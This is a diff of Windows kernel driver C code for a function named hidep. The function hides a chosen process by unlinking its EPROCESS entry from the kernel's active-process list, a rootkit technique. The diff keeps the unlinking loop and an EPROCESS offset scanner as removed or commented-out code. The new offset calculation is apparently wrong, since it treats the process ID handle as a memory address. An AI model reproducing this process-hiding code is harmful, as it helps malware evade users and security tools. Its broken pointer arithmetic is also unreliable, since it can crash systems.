@@ -2,58 +2,59 @@
 
 PCHAR hidep(UINT32 pid) {
 
-	ULONG PID_OFFSET = find_eproc_pid();
-
-	ULONG LIST_OFFSET = PID_OFFSET;
-
-	LIST_OFFSET += sizeof(INT_PTR);
+	debugFile(L"\\DosDevices\\C:\\Windows\\grrr.txt");
 
 	PEPROCESS currentProcess = PsGetCurrentProcess();
-
-	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
-	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
 	
+	HANDLE CurrentPID = PsGetProcessId(currentProcess);
+	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)CurrentPID + sizeof(INT_PTR));
+	ULONG LIST_OFFSET = (ULONG)((ULONG_PTR)currentList - (ULONG_PTR)currentProcess);
 	
-
 	// Record the starting position
 	PEPROCESS StartProcess = currentProcess;
 
+	
+
+
 	// Move to next item
 	currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
-	CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
-	currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
 
 
-
-
+	/*CurrentPID = PsGetProcessId(currentProcess);
+	currentList = currentList->Flink;*/
 
 	// Loop until we find the right process to remove
 	// Or until we circle back
-	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentProcess) {
 
-		// Check item
-		if (*(UINT32*)CurrentPID == pid) {
-		
-			
+	debugFile(L"\\DosDevices\\C:\\Windows\\grozzy.txt");
 
-			PLIST_ENTRY prev = currentList->Blink;
-			PLIST_ENTRY next = currentList->Flink;
 
-			prev->Flink = next;
-			next->Blink = prev;
 
-			// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
-			currentList->Blink = (PLIST_ENTRY)&currentList->Flink;
-			currentList->Flink = (PLIST_ENTRY)&currentList->Flink;
+	//while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentProcess) {
 
-			break;
-		}
+	//	// Check item
+	//	if (*(UINT32*)CurrentPID == pid) {
+	//	
+	//		debugFile(L"\\DosDevices\\C:\\Windows\\pid.fnd");
 
-		// Move to next item
-		currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
-		CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
-		currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
-	}
+	//		PLIST_ENTRY prev = currentList->Blink;
+	//		PLIST_ENTRY next = currentList->Flink;
+
+	//		prev->Flink = next;
+	//		next->Blink = prev;
+
+	//		// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
+	//		currentList->Blink = (PLIST_ENTRY)&currentList->Flink;
+	//		currentList->Flink = (PLIST_ENTRY)&currentList->Flink;
+
+	//		break;
+	//	}
+
+	//	// Move to next item
+	//	currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
+	//	CurrentPID = PsGetProcessId(currentProcess);
+	//	currentList = currentList->Flink;
+	//}
 
 
 	
@@ -92,39 +93,30 @@ void debugFile(WCHAR name[]) {
 }
 
 
-ULONG find_eproc_pid() {
-
-	ULONG pid_ofs = 0;					// The offset we're looking for
-	int idx = 0;						// Index 
-	ULONG pid = 0;		
-	PEPROCESS eproc;
-
-	// Select 3 process PIDs and get their EPROCESS Pointer
-	for (int i = 16;; i += 4) {
-
-		if (PsLookupProcessByProcessId((HANDLE)i, &eproc) == STATUS_SUCCESS) {
-			pid = i;
-			break;
-		}
-	}
-
-	for (int i = 0x20; i < 0x300; i += 4) {
-		if ((*(ULONG*)((UCHAR*)eproc + i) == pid))
-		{
-			debugFile(L"\\DosDevices\\C:\\Windows\\here.txt");
-			pid_ofs = i; break;
-		}
-	}
-
-	
-
-
-	ObDereferenceObject(eprocs[0]);
-	ObDereferenceObject(eprocs[1]);
-	ObDereferenceObject(eprocs[2]);
-
-
-
-
-	return pid_ofs;
-}
+//ULONG find_eproc_pid() {
+//
+//	ULONG pid_ofs = 0;					// The offset we're looking for
+//	ULONG pid = 0;		
+//	PEPROCESS eproc;
+//	// Select 3 process PIDs and get their EPROCESS Pointer
+//	for (int i = 16;; i += 4) {
+//
+//		if (PsLookupProcessByProcessId((HANDLE)i, (PEPROCESS*)&eproc) == STATUS_SUCCESS) {
+//			pid = i;
+//			break;
+//		}
+//	}
+//
+//	for (int i = 0x20; i < 0x300; i += 4) {
+//		if ((*(ULONG*)((UCHAR*)eproc + i) == pid))
+//		{
+//			debugFile(L"\\DosDevices\\C:\\Windows\\off.fnd");
+//			pid_ofs = i; break;
+//		}
+//	}
+//
+//	
+//	ObDereferenceObject(eproc);
+//
+//	return pid_ofs;
+//}
